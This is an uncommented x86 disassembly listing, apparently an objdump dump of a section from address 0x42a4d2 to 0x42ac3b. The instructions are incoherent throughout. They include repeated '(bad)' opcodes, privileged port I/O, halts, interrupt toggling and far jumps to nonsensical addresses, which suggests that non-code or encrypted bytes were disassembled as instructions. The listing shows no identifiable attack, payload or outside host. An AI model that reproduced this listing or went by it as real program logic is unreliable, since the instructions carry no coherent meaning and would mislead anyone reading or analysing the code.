  42a4d2:	and    BYTE PTR ds:0x91f86070,bl
  42a4d8:	xor    DWORD PTR [ecx-0x52],edx
  42a4db:	inc    eax
  42a4dc:	aad    0xf
  42a4de:	out    dx,al
  42a4df:	fiadd  DWORD PTR [edi+edi*2-0xe]
  42a4e3:	adc    dh,BYTE PTR [ebx]
  42a4e5:	xchg   esp,eax
  42a4e6:	stos   BYTE PTR es:[edi],al
  42a4e7:	mov    al,ds:0xf4bea625
  42a4ec:	fs hlt 
  42a4ee:	ret    0x5b22
  42a4f1:	mov    eax,esi
  42a4f3:	xchg   esi,eax
  42a4f4:	sti    
  42a4f5:	fdiv   QWORD PTR ds:0x237462a2
  42a4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4fc:	ds cmp al,0x95
  42a4ff:	mov    ds:0xe798282f,al
  42a504:	add    BYTE PTR [ebp+0x54],bl
  42a507:	jle    0x42a543
  42a509:	mov    DWORD PTR [edi],ecx
  42a50b:	les    ebx,FWORD PTR [esi-0x30]
  42a50e:	bound  ecx,QWORD PTR [edi-0x79eff3b4]
  42a514:	iret   
  42a515:	pusha  
  42a516:	es inc ebx
  42a518:	imul   ebx,DWORD PTR [ebx+0x52],0xffffffb4
  42a51c:	(bad)  
  42a51e:	out    dx,al
  42a51f:	fwait
  42a520:	inc    edi
  42a521:	inc    ebp
  42a522:	xchg   edi,esi
  42a524:	mov    ah,0x72
  42a526:	sahf   
  42a527:	jge    0x42a502
  42a529:	pusha  
  42a52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a52b:	cmp    al,0x5b
  42a52d:	sub    al,0xf9
  42a52f:	push   0xffffffb9
  42a531:	pop    ds
  42a532:	and    eax,0x8a61121d
  42a537:	xchg   ebx,eax
  42a538:	aas    
  42a539:	adc    dl,BYTE PTR [eax-0x2b]
  42a53c:	fwait
  42a53d:	pop    edi
  42a53e:	xchg   ebx,eax
  42a53f:	out    dx,eax
  42a540:	xchg   edi,eax
  42a541:	dec    BYTE PTR [eax-0x28]
  42a544:	jmp    0x361a:0x5ea74a84
  42a54b:	cdq    
  42a54c:	pop    ss
  42a54d:	lahf   
  42a54e:	push   esp
  42a54f:	shr    BYTE PTR [eax+0x7b],0x58
  42a553:	sub    BYTE PTR [esi],ah
  42a555:	popa   
  42a556:	and    ah,BYTE PTR [eax+0x4d]
  42a559:	inc    esi
  42a55a:	pop    ebp
  42a55b:	ret    0xc15e
  42a55e:	gs psllw mm6,0x1
  42a563:	cs pushf 
  42a565:	inc    eax
  42a566:	push   ds
  42a567:	pop    ss
  42a568:	loopne 0x42a5dd
  42a56a:	and    BYTE PTR [esi+0x51],0x68
  42a56e:	ds aad 0xde
  42a571:	jno    0x42a526
  42a573:	or     bh,BYTE PTR [ecx+0x30a0ca18]
  42a579:	stc    
  42a57a:	repnz mov dh,0x0
  42a57d:	jae    0x42a551
  42a57f:	mov    ah,BYTE PTR [eax+eax*2+0x6c]
  42a583:	out    dx,eax
  42a584:	adc    BYTE PTR [ecx+0x5071333b],ah
  42a58a:	out    0xa0,eax
  42a58c:	add    al,0x4d
  42a58e:	pop    ecx
  42a58f:	call   0x9c3de4ea
  42a594:	pop    esi
  42a595:	loope  0x42a5f5
  42a597:	(bad)  
  42a598:	into   
  42a599:	and    BYTE PTR [ebp+0x2609bf1],0x3a
  42a5a0:	shr    DWORD PTR [ebp-0x3643f473],0x23
  42a5a7:	pop    es
  42a5a8:	mov    eax,0xb38b7c60
  42a5ad:	mov    bh,0x29
  42a5af:	pop    edi
  42a5b0:	xchg   esi,eax
  42a5b1:	call   0x700132e4
  42a5b6:	or     eax,0xfcd55a61
  42a5bb:	or     eax,0x74eeecf3
  42a5c0:	cmp    ebx,DWORD PTR [ebp-0x1a51fc08]
  42a5c6:	jno    0x42a569
  42a5c8:	imul   eax,DWORD PTR [ecx-0x43],0x76ec1908
  42a5cf:	loopne 0x42a62f
  42a5d1:	fcom   QWORD PTR [eax]
  42a5d3:	das    
  42a5d4:	sub    al,0xc5
  42a5d6:	and    eax,0x1c59a841
  42a5db:	inc    esi
  42a5dc:	add    dl,BYTE PTR [edi+0x48]
  42a5df:	repnz hlt 
  42a5e1:	(bad)  
  42a5e2:	adc    esi,DWORD PTR [ecx-0x8617cb2]
  42a5e8:	pop    edi
  42a5e9:	aad    0x4c
  42a5eb:	jae    0x42a5d4
  42a5ed:	inc    eax
  42a5ee:	lds    esp,FWORD PTR [ebx]
  42a5f0:	pop    ds
  42a5f1:	repnz inc edi
  42a5f3:	dec    edx
  42a5f4:	lods   eax,DWORD PTR ds:[esi]
  42a5f5:	mov    ss,esi
  42a5f7:	mov    dh,BYTE PTR [esi+0x62]
  42a5fa:	sbb    DWORD PTR [edi-0x72856879],ebp
  42a600:	das    
  42a601:	retf   
  42a602:	out    dx,al
  42a603:	stc    
  42a604:	rcl    BYTE PTR [ebx+ecx*2],0xab
  42a608:	test   al,0x5
  42a60a:	out    dx,al
  42a60b:	add    bl,dl
  42a60d:	scas   al,BYTE PTR es:[edi]
  42a60e:	data16 and al,0x13
  42a611:	gs mov al,0xeb
  42a614:	aad    0x60
  42a616:	cdq    
  42a617:	ret    
  42a618:	jmp    0x42a603
  42a61a:	rcr    BYTE PTR [ecx-0x384973f2],1
  42a620:	int3   
  42a621:	pusha  
  42a622:	inc    ebp
  42a623:	pusha  
  42a624:	mov    esp,0x19fb676a
  42a629:	pop    esi
  42a62a:	mov    ebp,edi
  42a62c:	push   esi
  42a62d:	pop    ds
  42a62e:	mul    BYTE PTR [esi+ecx*8+0x54c02728]
  42a635:	nop
  42a636:	fcmovnu st,st(2)
  42a638:	pop    esi
  42a639:	fs inc edx
  42a63b:	shr    BYTE PTR [esp+eax*4],cl
  42a63e:	aaa    
  42a63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a640:	and    ecx,ecx
  42a642:	out    dx,eax
  42a643:	push   0x9186b79a
  42a648:	rcl    BYTE PTR [esi-0x12],0x88
  42a64c:	lods   eax,DWORD PTR ds:[esi]
  42a64d:	out    0x1f,al
  42a64f:	call   0xc3dc:0xa0ad73e9
  42a656:	(bad)  
  42a657:	in     eax,dx
  42a658:	jnp    0x42a61e
  42a65a:	push   cs
  42a65b:	fst    QWORD PTR [ebx+edi*8+0x1c]
  42a65f:	dec    esi
  42a660:	sahf   
  42a661:	hlt    
  42a662:	out    0x13,al
  42a664:	pop    ss
  42a665:	jp     0x42a636
  42a667:	jo     0x42a6c3
  42a669:	pop    edx
  42a66a:	or     edx,edi
  42a66c:	sub    esp,DWORD PTR [esi-0x5f0bfb18]
  42a672:	xchg   esp,eax
  42a673:	jns    0x42a694
  42a675:	jl     0x42a665
  42a677:	inc    eax
  42a678:	std    
  42a679:	int3   
  42a67a:	cmp    dh,BYTE PTR [esi]
  42a67c:	(bad)  fs:[edi+ecx*4+0x282d18ee]
  42a684:	inc    edi
  42a685:	shl    DWORD PTR [edi],1
  42a687:	jno    0x42a60a
  42a689:	test   eax,0x865ec64e
  42a68e:	into   
  42a68f:	shl    DWORD PTR [ebx-0x16],cl
  42a692:	cmp    al,ch
  42a694:	pop    esp
  42a695:	popa   
  42a696:	mov    ebp,ss
  42a698:	fldenv [edi+0x14434df7]
  42a69e:	in     al,dx
  42a69f:	cli    
  42a6a0:	(bad)
  42a6a3:	cmp    edx,DWORD PTR [ebx-0x5f]
  42a6a6:	sub    BYTE PTR [ebx+0x3fc460b8],dh
  42a6ac:	sub    al,0x44
  42a6ae:	shl    BYTE PTR [eax-0x26],0x48
  42a6b2:	out    dx,al
  42a6b3:	repz cmp eax,0xb631fffb
  42a6b9:	mov    ecx,0x8185a0be
  42a6be:	stc    
  42a6bf:	cmp    ah,0x98
  42a6c2:	mov    ecx,0xeebbf4d9
  42a6c7:	pop    ss
  42a6c8:	mov    ah,0xfe
  42a6ca:	jnp    0x42a6ff
  42a6cc:	lds    ebp,FWORD PTR [ebp-0x7e845ee0]
  42a6d2:	mov    cl,0x3d
  42a6d4:	fdivr  st(2),st
  42a6d6:	and    al,0x8c
  42a6d8:	pop    esi
  42a6d9:	test   DWORD PTR [edi-0x4e],edx
  42a6dc:	dec    ecx
  42a6dd:	test   BYTE PTR [eax+0x1560b88f],dh
  42a6e3:	cmp    eax,0x684a0539
  42a6e8:	cdq    
  42a6e9:	cmp    bl,BYTE PTR [edi]
  42a6eb:	and    DWORD PTR [edx-0x2ac002a0],ecx
  42a6f1:	clc    
  42a6f2:	sub    al,0x95
  42a6f4:	lods   eax,DWORD PTR ds:[esi]
  42a6f5:	pusha  
  42a6f6:	js     0x42a6ab
  42a6f8:	popa   
  42a6f9:	fwait
  42a6fa:	das    
  42a6fb:	add    al,0xaa
  42a6fd:	mov    ch,dh
  42a6ff:	xor    BYTE PTR [ebx],bl
  42a701:	mov    ebp,0x588b0d88
  42a706:	stc    
  42a707:	jmp    0x42a6ca
  42a709:	pusha  
  42a70a:	icebp  
  42a70b:	pop    ebx
  42a70c:	arpl   WORD PTR [ecx-0x5c7b940b],ax
  42a712:	out    dx,eax
  42a713:	mov    ah,0x1c
  42a715:	xchg   edi,eax
  42a716:	and    eax,0x870109ff
  42a71b:	xchg   dx,ax
  42a71d:	adc    bl,bh
  42a71f:	mov    WORD PTR [edi],ss
  42a721:	push   0x5f
  42a723:	loope  0x42a7a1
  42a725:	rcl    ah,0xa5
  42a728:	ins    BYTE PTR es:[edi],dx
  42a729:	loopne 0x42a719
  42a72b:	fucom  st(0)
  42a72d:	cmp    eax,0x899d97ab
  42a732:	jae    0x42a6d5
  42a734:	in     al,dx
  42a735:	mov    cl,0x80
  42a737:	popa   
  42a738:	dec    ecx
  42a739:	aad    0x88
  42a73b:	cs pop esi
  42a73d:	xchg   esp,eax
  42a73e:	sub    ebx,DWORD PTR [edx-0x4c]
  42a741:	xor    ecx,DWORD PTR [ebp-0x6]
  42a744:	xchg   edi,eax
  42a745:	pusha  
  42a746:	xchg   ebp,eax
  42a747:	imul   edx,DWORD PTR [edx],0x71
  42a74a:	cmp    dl,BYTE PTR [ebx+eiz*2+0x156ffb12]
  42a751:	fs out dx,al
  42a753:	(bad)  
  42a754:	leave  
  42a755:	xor    DWORD PTR [ebx+0x105fc224],edi
  42a75b:	pop    esp
  42a75c:	imul   eax,esi,0xfffffffe
  42a75f:	jle    0x42a711
  42a761:	mov    al,ds:0x7f5eb573
  42a766:	jbe    0x42a775
  42a768:	add    eax,0x61711211
  42a76d:	popa   
  42a76e:	mov    bl,0xfa
  42a770:	inc    ecx
  42a771:	ja     0x42a773
  42a773:	jl     0x42a796
  42a775:	pop    ebx
  42a776:	out    dx,al
  42a777:	mov    dh,0xd0
  42a779:	retf   
  42a77a:	mov    dl,0x4f
  42a77c:	ins    BYTE PTR es:[edi],dx
  42a77d:	aaa    
  42a77e:	sbb    al,0xa0
  42a780:	add    DWORD PTR [ebp-0xfc17e71],esi
  42a786:	mov    edi,0xeecd73bf
  42a78b:	or     eax,0x65ecffe3
  42a790:	cmp    BYTE PTR [edx+0x78],ch
  42a793:	mov    eax,ds:0x27e17969
  42a798:	xor    DWORD PTR [ebx+edx*2],eax
  42a79b:	loop   0x42a7f8
  42a79d:	mov    ebp,0x8978e3c2
  42a7a2:	ds xor eax,ebx
  42a7a5:	sbb    al,0xd0
  42a7a7:	mov    ds:0x5728cd3d,eax
  42a7ac:	push   esp
  42a7ad:	add    cl,BYTE PTR [esi-0x1131d69b]
  42a7b3:	add    cl,BYTE PTR [eax+0x20b7078d]
  42a7b9:	cwde   
  42a7ba:	or     DWORD PTR [edi+0x660b4668],0x21e5e6f7
  42a7c4:	add    BYTE PTR [edx+0x40],dh
  42a7c7:	gs arpl bp,bp
  42a7ca:	jmp    0x42a7c3
  42a7cc:	xchg   esi,eax
  42a7cd:	dec    eax
  42a7ce:	(bad)  
  42a7cf:	xlat   BYTE PTR ds:[ebx]
  42a7d0:	mov    WORD PTR [eax+0x65276fdd],ss
  42a7d6:	mov    es:0x475ce5b,eax
  42a7dc:	mov    dl,al
  42a7de:	mov    ch,0x9
  42a7e0:	push   eax
  42a7e1:	pop    esp
  42a7e2:	out    dx,al
  42a7e3:	xor    bh,ch
  42a7e5:	xor    eax,0x2868cbfa
  42a7ea:	and    ecx,DWORD PTR [ebp+0x6143a2a3]
  42a7f0:	fs mov al,0x94
  42a7f3:	dec    edi
  42a7f4:	dec    eax
  42a7f5:	mov    al,ds:0x5db23df3
  42a7fa:	or     ebp,DWORD PTR [eax]
  42a7fc:	hlt    
  42a7fd:	inc    ecx
  42a7fe:	ds (bad) 
  42a800:	sbb    al,0xc8
  42a802:	xchg   edi,eax
  42a803:	mov    eax,ds:0xb06bacdc
  42a808:	icebp  
  42a809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a80a:	stos   BYTE PTR es:[edi],al
  42a80b:	test   al,0xf8
  42a80d:	int    0xeb
  42a80f:	inc    esp
  42a810:	xchg   edx,eax
  42a811:	dec    edx
  42a812:	fist   DWORD PTR cs:[ebp-0x34def372]
  42a819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81a:	cmp    eax,0xe0b8e3ac
  42a81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a820:	mov    dh,0x45
  42a822:	dec    edi
  42a823:	(bad)  
  42a824:	jmp    0xb081:0x485c74af
  42a82b:	mov    ds,WORD PTR [esi-0x40]
  42a82e:	pop    esi
  42a82f:	cli    
  42a830:	into   
  42a831:	pop    ds
  42a832:	ss pushw ss
  42a835:	popa   
  42a836:	pop    edi
  42a837:	jg     0x42a82c
  42a839:	xchg   edi,eax
  42a83a:	scas   al,BYTE PTR es:[edi]
  42a83b:	sar    ecx,cl
  42a83d:	sub    dh,0x4f
  42a840:	daa    
  42a841:	add    eax,0x8bbfbdc0
  42a846:	sub    ebp,DWORD PTR [eax-0x32]
  42a849:	mov    edx,0x7710c15d
  42a84e:	inc    ebp
  42a84f:	mov    DWORD PTR [esi+0x23],edx
  42a852:	outs   dx,DWORD PTR ds:[esi]
  42a853:	fimul  WORD PTR [eax-0x76]
  42a856:	rol    DWORD PTR [esi-0x26259ee2],cl
  42a85c:	xchg   esi,eax
  42a85d:	or     eax,0x901c9af2
  42a862:	and    eax,0x1e5ff862
  42a867:	jge    0x42a886
  42a869:	(bad)  
  42a86a:	ds mov esp,0xa0ca367a
  42a870:	js     0x42a855
  42a872:	int3   
  42a873:	out    dx,al
  42a874:	push   esp
  42a875:	scas   eax,DWORD PTR es:[edi]
  42a876:	xor    esi,DWORD PTR [edi+0x4e29a65e]
  42a87c:	inc    ecx
  42a87d:	in     eax,dx
  42a87e:	adc    BYTE PTR [ebp+0x1a],dl
  42a881:	pop    ebx
  42a882:	inc    edi
  42a883:	call   eax
  42a885:	leave  
  42a886:	es or  eax,0xe2bdb45b
  42a88c:	mov    dl,0xba
  42a88e:	xchg   edi,eax
  42a88f:	add    eax,0x70d2580e
  42a894:	scas   al,BYTE PTR es:[edi]
  42a895:	jl     0x42a8a1
  42a897:	pop    ebp
  42a898:	sub    DWORD PTR [ebx+0x36],edx
  42a89b:	repnz push 0xbda192e2
  42a8a1:	idiv   ah
  42a8a3:	cli    
  42a8a4:	mov    es,edx
  42a8a6:	data16 adc dl,ch
  42a8a9:	mov    ebx,0x3bb972eb
  42a8ae:	(bad)  
  42a8af:	into   
  42a8b0:	sar    al,0xfd
  42a8b3:	push   ecx
  42a8b4:	dec    edi
  42a8b5:	popa   
  42a8b6:	xor    ebp,edi
  42a8b8:	cmp    eax,0xd9fcda18
  42a8bd:	xor    ch,dh
  42a8bf:	cmp    ch,BYTE PTR [ebx-0x3a708749]
  42a8c5:	test   cl,ah
  42a8c7:	mov    al,ds:0xa73fe409
  42a8cc:	cmp    ecx,ecx
  42a8ce:	lea    edi,[edx-0x3f9e3aa2]
  42a8d4:	pop    edx
  42a8d5:	dec    ebp
  42a8d6:	cmp    DWORD PTR es:[edi+0x61],ebx
  42a8da:	lahf   
  42a8db:	or     esp,DWORD PTR [eax-0x1c]
  42a8de:	and    dh,BYTE PTR [ecx+edi*1]
  42a8e1:	jne    0x42a8d1
  42a8e3:	dec    eax
  42a8e4:	push   ds
  42a8e5:	jecxz  0x42a8e9
  42a8e7:	retf   
  42a8e8:	sub    BYTE PTR ds:0xafa4a9a7,bh
  42a8ee:	outs   dx,BYTE PTR ds:[esi]
  42a8ef:	in     al,0xa6
  42a8f1:	mov    al,ds:0xd1c505d5
  42a8f6:	out    0x5b,eax
  42a8f8:	shl    DWORD PTR [ecx],0x25
  42a8fb:	imul   ecx,DWORD PTR [esi],0xffffffac
  42a8fe:	push   eax
  42a8ff:	ins    BYTE PTR es:[edi],dx
  42a900:	fist   DWORD PTR [ecx-0x43]
  42a903:	(bad)  
  42a904:	cld    
  42a905:	fimul  DWORD PTR [ebp-0x45ea6912]
  42a90b:	push   esp
  42a90c:	fucom  st(5)
  42a90e:	add    BYTE PTR [ebx-0x7cc310bf],cl
  42a914:	pop    esi
  42a915:	xor    BYTE PTR [esi-0x1d],bh
  42a918:	fild   WORD PTR [edx-0x29]
  42a91b:	mov    ds:0x7558918,eax
  42a920:	jge    0x42a8ae
  42a922:	mov    fs,WORD PTR [edx-0x51]
  42a925:	shr    esi,1
  42a927:	out    dx,eax
  42a928:	or     BYTE PTR [eax+0x47],bl
  42a92b:	mov    bh,bh
  42a92d:	or     BYTE PTR [ecx-0x5f],0x15
  42a931:	mov    DWORD PTR [eax],ecx
  42a933:	mov    DWORD PTR [eax-0x54],ebp
  42a936:	mov    ebx,0xc1fe51fe
  42a93b:	mov    ah,0x9b
  42a93d:	push   eax
  42a93e:	psrad  mm7,QWORD PTR [esi-0x3c]
  42a942:	pop    eax
  42a943:	adc    al,0x89
  42a945:	pop    ebp
  42a946:	push   ecx
  42a947:	sbb    dh,BYTE PTR [esi-0x19736bf4]
  42a94d:	rol    BYTE PTR [esp+esi*8+0x5a],0x59
  42a952:	(bad)  
  42a954:	int3   
  42a955:	out    dx,al
  42a956:	sub    esi,DWORD PTR [eax+edi*4-0x16750558]
  42a95d:	pusha  
  42a95e:	jns    0x42a9ce
  42a960:	lahf   
  42a961:	iret   
  42a962:	pop    ecx
  42a963:	pop    edi
  42a964:	pop    edx
  42a965:	aaa    
  42a966:	(bad)  
  42a967:	push   0xfffffff1
  42a969:	pusha  
  42a96a:	mov    ebx,0x62980473
  42a96f:	pop    es
  42a970:	inc    eax
  42a971:	popa   
  42a972:	inc    ebp
  42a973:	call   0x7909:0x4f90e824
  42a97a:	push   esi
  42a97b:	inc    ebx
  42a97c:	pop    esi
  42a97d:	push   edx
  42a97e:	outs   dx,BYTE PTR ds:[esi]
  42a97f:	ror    BYTE PTR [eax+0x22],cl
  42a982:	jb     0x42aa02
  42a984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a985:	(bad)  
  42a986:	int    0x61
  42a988:	pop    esi
  42a989:	and    al,0xc1
  42a98b:	cmp    edi,esi
  42a98d:	mov    dh,0x61
  42a98f:	sbb    BYTE PTR [esi+0x58],0xf4
  42a993:	sbb    ch,BYTE PTR [edx]
  42a995:	inc    esi
  42a996:	retf   0x7938
  42a999:	pusha  
  42a99a:	(bad)  
  42a99b:	xchg   ebp,eax
  42a99d:	xchg   edx,eax
  42a99e:	out    dx,eax
  42a99f:	stos   BYTE PTR es:[edi],al
  42a9a0:	push   ss
  42a9a1:	leave  
  42a9a2:	and    edx,DWORD PTR [ecx]
  42a9a4:	ins    DWORD PTR es:[edi],dx
  42a9a5:	pusha  
  42a9a6:	or     ebx,ecx
  42a9a8:	mov    dl,0x16
  42a9aa:	mov    esi,0xd960e85f
  42a9af:	pop    esp
  42a9b0:	mov    eax,0x167d824
  42a9b5:	push   ds
  42a9b6:	out    dx,al
  42a9b7:	int    0x71
  42a9b9:	add    eax,0xa28a6c97
  42a9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9bf:	div    BYTE PTR [ecx]
  42a9c1:	popa   
  42a9c2:	cld    
  42a9c3:	pop    eax
  42a9c4:	push   edi
  42a9c5:	dec    esi
  42a9c6:	sbb    edi,DWORD PTR [edi]
  42a9c8:	push   esp
  42a9c9:	or     dh,ch
  42a9cb:	iret   
  42a9cc:	fs adc al,0xd8
  42a9cf:	xor    al,0x93
  42a9d1:	lds    eax,FWORD PTR [edi-0xa]
  42a9d4:	fldenv [eax-0x30]
  42a9d7:	fiadd  WORD PTR [ebp+0x23564225]
  42a9dd:	and    dh,ch
  42a9df:	cmp    bh,ch
  42a9e1:	arpl   WORD PTR [ebx],si
  42a9e3:	inc    edx
  42a9e4:	mov    esi,DWORD PTR [edi+edx*2]
  42a9e7:	mov    eax,ds:0x718c411b
  42a9ec:	xchg   ecx,esp
  42a9ee:	mov    DWORD PTR [ebp+0x5e],edi
  42a9f1:	dec    esi
  42a9f2:	push   ds
  42a9f3:	lea    esp,ds:0x218f1dc9
  42a9f9:	pop    edx
  42a9fa:	mov    ebx,0xf8c05822
  42a9ff:	sar    bh,0xdd
  42aa02:	fdivr  DWORD PTR [eax]
  42aa04:	push   esp
  42aa05:	sahf   
  42aa06:	(bad)  
  42aa07:	aaa    
  42aa08:	ficom  WORD PTR [ecx+0x1b]
  42aa0b:	xchg   ecx,edi
  42aa0d:	sub    BYTE PTR [edx],dh
  42aa0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa10:	sti    
  42aa11:	jae    0x42aa4e
  42aa13:	imul   eax,DWORD PTR [edx-0xb0b81b4],0x40
  42aa1a:	out    dx,al
  42aa1b:	jg     0x42aa0f
  42aa1d:	pop    ds
  42aa1e:	jg     0x42aa72
  42aa20:	inc    edi
  42aa21:	and    al,0x3c
  42aa23:	stos   DWORD PTR es:[edi],eax
  42aa24:	push   ss
  42aa25:	sub    esi,ebp
  42aa27:	cld    
  42aa28:	enter  0xc5c5,0x93
  42aa2c:	sahf   
  42aa2d:	loop   0x42aa1c
  42aa2f:	rcl    DWORD PTR [ebp-0x175350e2],0x3a
  42aa36:	into   
  42aa37:	push   ebx
  42aa38:	(bad)  
  42aa3a:	cmc    
  42aa3b:	mov    al,ds:0xeac508ff
  42aa40:	out    dx,eax
  42aa41:	pushf  
  42aa42:	mov    dl,0x4
  42aa44:	pop    esi
  42aa45:	push   ecx
  42aa46:	aas    
  42aa47:	scas   eax,DWORD PTR es:[edi]
  42aa48:	mov    DWORD PTR ds:0x61258fb8,edx
  42aa4e:	imul   ebp,DWORD PTR [ecx+0x7f],0x4d
  42aa52:	test   DWORD PTR [eax],eax
  42aa54:	mov    edi,0x56e1ee9c
  42aa59:	inc    ebp
  42aa5a:	int3   
  42aa5b:	lea    esi,[eax]
  42aa5d:	inc    ecx
  42aa5e:	xchg   edi,eax
  42aa5f:	mov    al,ds:0xfb66e239
  42aa64:	push   ds
  42aa65:	je     0x42aa0a
  42aa67:	enter  0xc3d8,0xf3
  42aa6b:	pop    esp
  42aa6c:	or     ecx,edx
  42aa6e:	mov    dh,0x20
  42aa70:	jnp    0x42aa79
  42aa72:	dec    ebp
  42aa73:	pop    esp
  42aa74:	jmp    0x479d:0xb0f7a460
  42aa7b:	mov    ss,WORD PTR [edi+0x54fbeef5]
  42aa81:	push   0xffffffbe
  42aa83:	mov    ds:0x937c7bae,eax
  42aa88:	out    0x7d,al
  42aa8a:	mov    eax,fs:0x65291b0b
  42aa90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa91:	jecxz  0x42aa81
  42aa93:	mov    esp,0x2560057f
  42aa98:	jmp    0x3de44f59
  42aa9d:	into   
  42aa9e:	stos   BYTE PTR es:[edi],al
  42aa9f:	retf   0xe0e
  42aaa2:	in     al,0x2
  42aaa4:	repz sbb ch,dh
  42aaa7:	sar    BYTE PTR [ecx-0x732af951],cl
  42aaad:	xchg   ecx,eax
  42aaae:	test   DWORD PTR [ecx-0x1fe64098],esp
  42aab4:	push   esi
  42aab6:	into   
  42aab7:	push   ebp
  42aab8:	pop    esi
  42aab9:	cmp    al,0xec
  42aabb:	inc    edi
  42aabc:	(bad)  [edi]
  42aabe:	je     0x42aa54
  42aac0:	jno    0x42ab22
  42aac2:	adc    BYTE PTR [esp+ebx*1+0x26],ah
  42aac6:	mov    edi,0xe76de06a
  42aacb:	cmp    BYTE PTR [ebp+0x7a],ch
  42aace:	xor    cl,BYTE PTR [esi-0x2]
  42aad1:	loopne 0x42aac7
  42aad3:	jo     0x42ab1a
  42aad5:	popa   
  42aad6:	inc    eax
  42aad7:	int    0x38
  42aad9:	ja     0x42ab52
  42aadb:	inc    edi
  42aadc:	pop    ebp
  42aadd:	adc    eax,0x175e245c
  42aae2:	js     0x42aa99
  42aae4:	call   0xb860:0x84c53037
  42aaeb:	jmp    DWORD PTR [esi-0x15]
  42aaee:	ja     0x42aa80
  42aaf0:	call   0xeee79796
  42aaf5:	pop    edi
  42aaf6:	ds iret 
  42aaf8:	loopne 0x42aab7
  42aafa:	add    eax,0x44210e30
  42aaff:	push   eax
  42ab00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab01:	inc    edx
  42ab02:	adc    eax,0x42e14fed
  42ab07:	cmp    ah,BYTE PTR [edi+0x5ee8f43e]
  42ab0d:	jbe    0x42aa97
  42ab0f:	mov    edi,0x4f7d17d1
  42ab14:	cmp    eax,0xeab4c961
  42ab19:	mov    eax,ds:0x3c2b5d
  42ab1e:	out    dx,eax
  42ab1f:	sbb    edx,edx
  42ab21:	das    
  42ab22:	mov    bh,BYTE PTR [eax]
  42ab24:	in     al,0x3a
  42ab26:	or     eax,0x1da94da1
  42ab2b:	lea    esp,[esi]
  42ab2d:	je     0x42ab38
  42ab2f:	push   eax
  42ab30:	pop    esi
  42ab31:	cmp    al,0x3a
  42ab33:	les    esi,FWORD PTR [eax+0x34]
  42ab36:	xchg   ebp,eax
  42ab37:	sbb    BYTE PTR [eiz*4-0x70cb5d64],bh
  42ab3e:	pusha  
  42ab3f:	scas   al,BYTE PTR es:[edi]
  42ab40:	cmp    al,BYTE PTR [esi+0x67b2f180]
  42ab46:	out    dx,al
  42ab47:	mov    ah,0xe0
  42ab49:	add    bh,al
  42ab4b:	dec    eax
  42ab4c:	scas   eax,DWORD PTR es:[edi]
  42ab4d:	push   0xd4ba0ef
  42ab52:	inc    edx
  42ab53:	xchg   ecx,eax
  42ab54:	add    BYTE PTR [ecx],cl
  42ab56:	nop
  42ab57:	xlat   BYTE PTR ds:[ebx]
  42ab58:	pop    esi
  42ab59:	adc    DWORD PTR [ebp-0x41],ebp
  42ab5c:	adc    BYTE PTR [ebp+0x28b426c4],ch
  42ab62:	lock mov al,ds:0x6238a587
  42ab68:	xchg   ecx,eax
  42ab69:	mov    al,ds:0x463bc4e
  42ab6e:	fimul  DWORD PTR [eax+0x3e4440bc]
  42ab74:	vmaxsd xmm4,xmm3,QWORD PTR [ecx-0x33a8cf59]
  42ab7c:	mov    ch,dh
  42ab7e:	add    eax,0x26c95e6e
  42ab83:	ins    DWORD PTR es:[edi],dx
  42ab84:	add    eax,0x277346ab
  42ab89:	mov    ecx,0x87e3a0c7
  42ab8e:	mov    ds:0x376a30b4,eax
  42ab93:	xor    al,0x5e
  42ab95:	jo     0x42ab94
  42ab97:	in     eax,dx
  42ab98:	jl     0x42ab4b
  42ab9a:	cwde   
  42ab9b:	in     eax,0x63
  42ab9d:	or     DWORD PTR [esi+ebx*8+0x5e],eax
  42aba1:	inc    edi
  42aba2:	(bad)  
  42aba3:	call   0x3838:0xe7b1ff3a
  42abaa:	ins    BYTE PTR es:[edi],dx
  42abab:	pop    ds
  42abac:	sahf   
  42abad:	jmp    0xa17:0x10a7c126
  42abb4:	inc    ecx
  42abb5:	push   edx
  42abb6:	jb     0x42ab9a
  42abb8:	jnp    0x42abbd
  42abba:	dec    esi
  42abbb:	pop    ebp
  42abbc:	xor    di,bp
  42abbf:	popa   
  42abc0:	pop    esi
  42abc1:	adc    eax,DWORD PTR [esi]
  42abc3:	shl    DWORD PTR [esi-0x565b60d5],0x60
  42abca:	addr16 repz ss aas 
  42abce:	push   0x7e
  42abd0:	jl     0x42ac07
  42abd2:	out    dx,al
  42abd3:	pop    edx
  42abd4:	js     0x42abc7
  42abd6:	mov    al,ds:0x69f0284d
  42abdb:	jae    0x42ac07
  42abdd:	popa   
  42abde:	xor    eax,0x3fb6d164
  42abe3:	or     DWORD PTR [edx+esi*4+0x12c5e9ed],0xadbe538c
  42abee:	ds cmp al,0xaa
  42abf1:	pusha  
  42abf2:	shl    DWORD PTR [eax-0x11],0x97
  42abf6:	sbb    cl,BYTE PTR [ebp-0x35da337a]
  42abfc:	dec    esp
  42abfd:	push   edx
  42abfe:	lock dec ebp
  42ac00:	test   BYTE PTR [edi+0x7b9263b1],bh
  42ac06:	sub    al,BYTE PTR [edx]
  42ac08:	mov    al,ds:0xb3c58b5f
  42ac0d:	xor    dl,BYTE PTR [esi+ebp*4-0x22]
  42ac11:	mov    al,0x8
  42ac13:	ret    0xc554
  42ac16:	inc    ecx
  42ac17:	adc    al,0x9f
  42ac19:	stc    
  42ac1a:	cli    
  42ac1b:	pop    ss
  42ac1c:	popf   
  42ac1d:	enter  0x811a,0x65
  42ac21:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42ac23:	rcr    BYTE PTR ds:[ebx],1
  42ac26:	ret    
  42ac27:	mov    al,ds:0x603e990
  42ac2c:	(bad)  
  42ac2d:	clc    
  42ac2e:	out    dx,al
  42ac2f:	sbb    ebx,esp
  42ac31:	jo     0x42ac26
  42ac33:	add    ebp,ebp
  42ac35:	retf   0x9eda
  42ac38:	or     bl,dh
  42ac3a:	cli    
  42ac3b:	(bad)  
